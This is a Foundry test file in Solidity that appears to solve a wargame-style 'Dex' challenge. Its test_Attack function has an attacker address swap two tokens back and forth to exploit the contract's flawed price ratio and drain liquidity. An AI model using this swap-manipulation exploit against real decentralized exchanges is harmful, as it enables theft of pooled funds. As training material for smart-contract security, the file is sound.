// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/Dex.sol";

contract DexTest is Test {
    SwappableToken public swappabletoken1;
    SwappableToken public swappabletoken2;
    Dex public dex;
    address attacker = makeAddr("attacker");

    function setUp() public {
        dex = new Dex();
        swappabletoken1 = new SwappableToken(
            address(dex),
            "Swap",
            "SW",
            110 ether
        );
        swappabletoken2 = new SwappableToken(
            address(dex),
            "Swap",
            "SW",
            110 ether
        );
        swappabletoken1.transfer(attacker, 10 ether);
        swappabletoken2.transfer(attacker, 10 ether);

        dex.setTokens(address(swappabletoken1), address(swappabletoken2));
        dex.approve(address(dex), 100 ether);
        dex.addLiquidity(address(swappabletoken1), 100 ether);
        dex.addLiquidity(address(swappabletoken2), 100 ether);

        assert(swappabletoken1.balanceOf(attacker) == 10 ether);
        assert(swappabletoken2.balanceOf(attacker) == 10 ether);
    }

    function test_Attack() public {
        vm.startPrank(attacker);
        dex.approve(address(dex), swappabletoken1.balanceOf(attacker));
        dex.swap(
            address(swappabletoken1),
            address(swappabletoken2),
            swappabletoken1.balanceOf(attacker)
        );
        dex.approve(address(dex), swappabletoken2.balanceOf(attacker));
        dex.swap(
            address(swappabletoken2),
            address(swappabletoken1),
            swappabletoken2.balanceOf(attacker)
        );
        dex.approve(address(dex), swappabletoken1.balanceOf(attacker));
        dex.swap(
            address(swappabletoken1),
            address(swappabletoken2),
            swappabletoken1.balanceOf(attacker)
        );
        dex.approve(address(dex), swappabletoken2.balanceOf(attacker));
        dex.swap(
            address(swappabletoken2),
            address(swappabletoken1),
            swappabletoken2.balanceOf(attacker)
        );
        // .....
        dex.approve(address(dex), swappabletoken1.balanceOf(attacker));
        dex.swap(
            address(swappabletoken1),
            address(swappabletoken2),
            swappabletoken1.balanceOf(attacker)
        );
        dex.approve(
            address(dex),
            swappabletoken2.balanceOf(attacker) - 40 ether
        );
        dex.swap(
            address(swappabletoken2),
            address(swappabletoken1),
            swappabletoken2.balanceOf(attacker) - 40 ether
        );
        console.log(
            swappabletoken1.balanceOf(attacker),
            swappabletoken2.balanceOf(attacker)
        );
        vm.stopPrank();
    }
}
